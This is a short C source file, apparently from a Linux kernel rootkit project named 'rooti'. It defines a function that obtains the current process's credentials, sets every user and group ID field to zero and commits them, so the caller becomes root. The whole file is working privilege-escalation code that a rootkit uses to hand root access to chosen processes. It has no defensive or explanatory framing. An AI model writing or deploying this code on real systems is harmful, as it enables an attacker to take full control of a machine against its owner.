#include <linux/cred.h>
#include "privilege.h"
#include "../utils.h"

int rooti_elevate_privilege(void)
{
    struct cred *creds = prepare_creds();
    if (creds == NULL) {
        ROOTI_DEBUG("prepare_creds() failed, out of memory");
        return -ENOMEM;
    }

    // Modify credentials to those of root user & group
    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;
    commit_creds(creds);

    return 0;
}
